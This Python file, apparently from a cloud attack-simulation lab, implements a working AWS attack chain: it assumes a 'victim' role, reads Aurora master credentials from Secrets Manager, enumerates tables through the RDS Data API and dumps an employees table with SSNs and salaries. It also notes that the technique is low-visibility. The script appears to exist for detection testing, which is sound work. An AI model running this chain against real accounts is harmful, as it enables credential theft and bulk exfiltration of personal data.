# FILE: attack.py
"""
ATOMIC_RDS_DATA_API_QUERY - Aurora Serverless v2 Data API Exfiltration
Technique T1213: Data from Information Repositories (Collection)

Phase 1 - Secret Retrieval:   secretsmanager:GetSecretValue resolves Aurora master creds
Phase 2 - Data API Exfil:     rds-data:ExecuteStatement enumerates schema then dumps PII table
                               over HTTPS - no VPC network path required.

Entry point: run(outputs, region)
"""
import sys
import time
import random
import json
import pathlib

import boto3
from botocore.exceptions import ClientError

# Cross-platform UTF-8 output - prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ---------------------------------------------------------------------------
# Resource names - single source of truth
# ---------------------------------------------------------------------------
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} - names will fall back to outputs keys")

_R   = _NAMES.get("resources", {})           # static names (secret paths, cluster ids, ...)
_PKS = _NAMES.get("pulumi_export_keys", {})  # semantic key -> pulumi export key (for dynamic values)


_TENANT_CREDS = {}


def _set_tenant_credentials(outputs):
    """Remember the tenant's short-lived credentials. In the MayaTrail backend the
    worker injects them as outputs['_aws_credentials']; without this the first STS
    call would run as the Celery worker identity instead of the tenant account."""
    _TENANT_CREDS.clear()
    _TENANT_CREDS.update((outputs or {}).get("_aws_credentials") or {})


def _base_session(region):
    """Session for the tenant's connected role, or the ambient default session for
    standalone runs where no credentials were injected."""
    if _TENANT_CREDS:
        return boto3.Session(
            aws_access_key_id=_TENANT_CREDS.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=_TENANT_CREDS.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=_TENANT_CREDS.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _assume_lab_role(role_arn, session_name, region, max_attempts=6):
    """Assume the lab's role from the tenant session. A freshly created role can
    return AccessDenied for a few seconds while IAM propagates, so retry."""
    sts = _base_session(region).client("sts")
    last = None
    for attempt in range(1, max_attempts + 1):
        try:
            c = sts.assume_role(RoleArn=role_arn, RoleSessionName=session_name, DurationSeconds=3600)["Credentials"]
            return boto3.Session(
                aws_access_key_id=c["AccessKeyId"],
                aws_secret_access_key=c["SecretAccessKey"],
                aws_session_token=c["SessionToken"],
                region_name=region,
            )
        except ClientError as exc:
            last = exc
            if exc.response["Error"]["Code"] in ("AccessDenied", "InvalidClientTokenId") and attempt < max_attempts:
                time.sleep(5)
                continue
            raise
    raise RuntimeError(f"AssumeRole {role_arn} failed: {last}")


def _r(key, default=""):
    """Resolve a static resource name from resource_names.json."""
    return _R.get(key, default)


def _p(outputs, key, default=""):
    """Resolve a dynamic value: pulumi_export_keys lookup -> outputs dict -> default."""
    export_key = _PKS.get(key, key)
    return outputs.get(export_key) or default


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))


def phase_delay():
    time.sleep(random.uniform(5, 15))


def print_step(msg):
    print(f"\n[*] {msg}")


def print_ok(msg):
    print(f"[+] {msg}")


def print_err(msg):
    print(f"[-] {msg}")


def _extract_field(field_dict):
    """Pull a scalar value out of a rds-data field object."""
    for vtype in ("stringValue", "longValue", "doubleValue", "booleanValue"):
        if vtype in field_dict:
            return str(field_dict[vtype])
    if field_dict.get("isNull"):
        return "NULL"
    return "?"


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def run(outputs: dict, region: str = "us-east-1") -> None:
    # ------------------------------------------------------------------
    # Resolve required outputs - all dynamic values come from the stack
    # via _p() which maps through pulumi_export_keys in resource_names.json
    # ------------------------------------------------------------------
    _set_tenant_credentials(outputs)
    victim_role_arn   = _p(outputs, "victim_role_arn")
    # resource_names.json pulumi_export_keys: cluster_arn -> "cluster_arn", secret_arn -> "secret_arn"
    cluster_arn       = _p(outputs, "cluster_arn")
    secret_arn        = _p(outputs, "secret_arn")

    missing = [k for k, v in {
        "victim_role_arn":          victim_role_arn,
        "cluster_arn":              cluster_arn,
        "secret_arn":               secret_arn,
    }.items() if not v]
    if missing:
        raise RuntimeError(f"Missing required stack outputs: {', '.join(missing)}")

    # Static names from resource_names.json (for display only - never passed to AWS APIs)
    secret_name  = _r("secret_name",  "prod/labcorp/aurora-master-creds")
    cluster_id   = _r("cluster_id",   "atomic-rds-data-api-query-aurora-cluster")

    # The lab's victim role holds rds-data + secret read; the tenant's connected
    # role only needs sts:AssumeRole on it.
    victim_session = _assume_lab_role(victim_role_arn, "rds-data-api-query", region)

    events_generated = []
    row_count = 0

    # This attack is entirely read-only (no resources created or mutated).
    # The try/finally below ensures the summary and any future cleanup
    # always runs even if an unexpected exception escapes an inner handler.
    try:
        # ==================================================================
        # PHASE 1 - Secret Retrieval
        # Attacker must resolve the Aurora master credential secret before
        # making any rds-data call because secretArn is a required parameter
        # on every ExecuteStatement request.  Retrieving the secret also
        # surfaces the DB hostname/port/name for reconnaissance.
        # ==================================================================
        print_step("PHASE 1 - Secret Retrieval")
        print_step(
            f"Step 1 (T1213): secretsmanager:GetSecretValue"
            f" - resolving Aurora master creds (secret: {secret_name})"
        )

        sm = victim_session.client("secretsmanager", region_name=region)

        try:
            resp = sm.get_secret_value(SecretId=secret_arn)
            version_id = resp.get("VersionId", "unknown")
            secret_string = resp.get("SecretString", "")
            events_generated.append("GetSecretValue (secretsmanager.amazonaws.com)")
            print_ok(f"GetSecretValue succeeded - VersionId: {version_id}")

            try:
                creds_blob = json.loads(secret_string)
                print_ok(
                    f"Credential blob parsed - engine={creds_blob.get('engine', '?')}"
                    f" db={creds_blob.get('dbname', '?')} user={creds_blob.get('username', '?')}"
                )
            except (json.JSONDecodeError, TypeError):
                print_err("SecretString is not valid JSON - proceeding with raw value")

        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDeniedException", "AccessDenied"):
                # IAM Deny guard is in effect; the CloudTrail event still fires
                print_ok(f"GetSecretValue returned {code} - deny guard active (CloudTrail event generated)")
                events_generated.append(f"GetSecretValue DENIED ({code}) (secretsmanager.amazonaws.com)")
            else:
                print_err(f"GetSecretValue unexpected error [{code}]: {e}")
                raise

        op_delay(2, 5)
        phase_delay()

        # ==================================================================
        # PHASE 2 - Data API Exfiltration
        # The Aurora Serverless v2 HTTP endpoint (Data API) is reachable
        # over public HTTPS - the attacker never needs network access to the
        # VPC private subnets.  CloudTrail data events for ExecuteStatement
        # are disabled by default, making this technique low-visibility.
        # ==================================================================
        print_step("PHASE 2 - Data API Exfiltration")
        print_step(f"Using cluster: {cluster_id}")

        rds_data = victim_session.client("rds-data", region_name=region)

        # ------------------------------------------------------------------
        # Step 2 (T1213): Schema enumeration - identify target tables
        # The attack plan specifies SHOW TABLES; the cluster engine is
        # aurora-postgresql, which does not support that MySQL syntax.
        # We attempt SHOW TABLES first (as per the plan) and fall back to
        # information_schema if the engine rejects it.
        # ------------------------------------------------------------------
        print_step(
            "Step 2 (T1213): rds-data:ExecuteStatement - SHOW TABLES"
            " (schema enumeration on labcorp_hr)"
        )

        tables_found = []

        def _enum_via_information_schema():
            """PostgreSQL-compatible table enumeration fallback."""
            fb = rds_data.execute_statement(
                resourceArn=cluster_arn,
                secretArn=secret_arn,
                database="labcorp_hr",
                sql=(
                    "SELECT table_name FROM information_schema.tables"
                    " WHERE table_schema = 'public' ORDER BY table_name"
                ),
            )
            return fb.get("records", [])

        try:
            enum_resp = rds_data.execute_statement(
                resourceArn=cluster_arn,
                secretArn=secret_arn,
                database="labcorp_hr",
                sql="SHOW TABLES",
            )
            records = enum_resp.get("records", [])
            tables_found = [_extract_field(row[0]) for row in records if row]
            print_ok(f"SHOW TABLES returned {len(records)} rows: {tables_found}")
            events_generated.append(
                "ExecuteStatement SHOW TABLES (rds-data.amazonaws.com) - data event"
            )

        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDeniedException", "AccessDenied"):
                print_ok(f"ExecuteStatement (SHOW TABLES) returned {code} - deny guard active")
                events_generated.append(
                    f"ExecuteStatement SHOW TABLES DENIED ({code}) (rds-data.amazonaws.com)"
                )
            elif code in ("BadRequestException", "DatabaseErrorException"):
                # Aurora PostgreSQL rejects MySQL SHOW TABLES - fall back to pg syntax
                print_err(f"SHOW TABLES not supported by this engine [{code}] - trying information_schema fallback")
                try:
                    fb_records = _enum_via_information_schema()
                    tables_found = [_extract_field(row[0]) for row in fb_records if row]
                    print_ok(f"information_schema returned {len(fb_records)} tables: {tables_found}")
                    events_generated.append(
                        "ExecuteStatement information_schema.tables (rds-data.amazonaws.com) - data event"
                    )
                except ClientError as fe:
                    fcode = fe.response["Error"]["Code"]
                    if fcode in ("AccessDeniedException", "AccessDenied"):
                        print_ok(f"information_schema fallback returned {fcode} - deny guard active")
                        events_generated.append(
                            f"ExecuteStatement information_schema DENIED ({fcode}) (rds-data.amazonaws.com)"
                        )
                    else:
                        print_err(f"information_schema fallback unexpected error [{fcode}]: {fe}")
                        raise
            else:
                print_err(f"ExecuteStatement (SHOW TABLES) unexpected error [{code}]: {e}")
                raise

        op_delay(2, 6)

        # ------------------------------------------------------------------
        # Step 3 (T1213): Full PII table dump - SELECT * FROM employees
        # Bait-seed function pre-populated 50 rows of realistic PII
        # (full_name, email, SSN, salary, department).  Query results are
        # returned inline in the API response body - no secondary network
        # channel needed for exfiltration.
        # ------------------------------------------------------------------
        print_step(
            "Step 3 (T1213): rds-data:ExecuteStatement"
            " - SELECT * FROM employees (full PII table dump)"
        )

        try:
            dump_resp = rds_data.execute_statement(
                resourceArn=cluster_arn,
                secretArn=secret_arn,
                database="labcorp_hr",
                sql=(
                    "SELECT id, full_name, email, ssn, salary, department"
                    " FROM employees"
                ),
                includeResultMetadata=True,
            )
            col_meta = dump_resp.get("columnMetadata", [])
            col_names = [c.get("label") or c.get("name", "col") for c in col_meta]
            records = dump_resp.get("records", [])
            row_count = len(records)

            print_ok(f"SELECT returned {row_count} rows, columns: {col_names}")

            for i, row in enumerate(records[:3]):
                vals = [_extract_field(f) for f in row]
                print_ok(f"  row[{i}]: {vals}")
            if row_count > 3:
                print_ok(f"  ... ({row_count - 3} more rows exfiltrated inline in API response)")

            events_generated.append(
                f"ExecuteStatement SELECT employees ({row_count} rows)"
                " (rds-data.amazonaws.com) - data event"
            )

        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDeniedException", "AccessDenied"):
                print_ok(f"ExecuteStatement (SELECT employees) returned {code} - deny guard active")
                events_generated.append(
                    f"ExecuteStatement SELECT employees DENIED ({code}) (rds-data.amazonaws.com)"
                )
            else:
                print_err(f"ExecuteStatement (SELECT employees) unexpected error [{code}]: {e}")
                raise

        op_delay(3, 8)

    finally:
        # Read-only attack - no resources were created or mutated.
        # This finally block satisfies the safety contract: any future
        # mutation added to this script must place its revert here.
        print("\n[*] Cleanup: read-only attack - no resources created, no client resources modified.")

    # ==================================================================
    # SUMMARY
    # ==================================================================
    print("\n" + "=" * 60)
    print("[*] ATOMIC_RDS_DATA_API_QUERY - Attack Chain Complete")
    print("=" * 60)
    print(f"[*] Region      : {region}")
    print(f"[*] Cluster ARN : {cluster_arn}")
    print(f"[*] Secret ARN  : {secret_arn}")
    print(f"[*] Rows dumped : {row_count}")
    print(f"[*] Events generated ({len(events_generated)}):")
    for evt in events_generated:
        print(f"      - {evt}")
    print("=" * 60)
